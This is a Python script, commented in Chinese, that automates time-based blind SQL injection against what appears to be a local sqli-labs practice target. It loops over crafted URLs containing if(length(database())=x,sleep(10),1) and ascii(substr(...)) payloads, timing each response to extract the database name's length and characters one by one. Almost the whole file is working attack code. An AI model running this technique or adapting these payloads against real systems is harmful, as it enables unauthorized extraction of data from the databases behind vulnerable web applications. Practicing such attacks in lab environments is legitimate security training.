# -*- coding: utf-8 -*-
import requests
import time

#计时
# time_start=time.time()
# time_end=time.time()
# print('time cost',time_end-time_start,'s')

# Ascii码转换
# print( 'c' , " 的ASCII 码为", ord('c'))   # ord(c) 将 c 转换成assii码形式
# print('111', "对应的字符为", chr(111))  # chr(111)  将 Ascii转换成字符 


#获取数据库长度
def get_database_length():
    times = 0
    x = 0
    while times < 10:
        time_start=time.time()
        #这里需要根据实际情况适当调节延时时间
        # url = f"http://192.168.3.148/Less-1/?id=1%27%20and%20if(length(database())={x},sleep(10),1)%20%20%20--+"
        url = f"http://192.168.3.148/Less-1/?id=1%27%20and%20if(length(database())={x},sleep(10),1)%20%20%20--+"
        print(url)
        header = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'}
        hh = requests.get(url,timeout=30,headers=header)
        time_end=time.time()
        times = time_end-time_start
        print(times)
        if times > 10:
            print('数据库长度为：',x)
            return x
            break
        x=x+1

# 逐个获取数据库的长度
def get_database_str(database_length):
    times = 0
    strs =[]
    for ll in range(1,database_length+1):
        # print(ll)
        for ss in range(1,128):
            # print(ss)
            time_start=time.time()
            #这里需要根据实际情况适当调节延时时间
            url = f"http://192.168.3.148/Less-1/?id=11%27%20and%20%20%20if(ascii(substr(database(),{ll},1))={ss},sleep(3),1)%20%20%20%20--+"
            # url = f"http://192.168.3.148/Less-1/?id=11%27%20and%20%20%20if(ascii(substr(database(),{ll},1))={ss},sleep(3),1)%20%20%20%20--+"
            # print(url)
            header = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'}
            hh = requests.get(url,timeout=30,headers=header)
            time_end=time.time()
            times = time_end-time_start
            # print(times)
            if times > 3:
                print(ll,'字符为：',chr(ss))
                strs.append(chr(ss))
                continue
    print('当前数据库名称为：',''.join(strs))



if __name__ == "__main__":
    pass
    get_database_str(get_database_length())
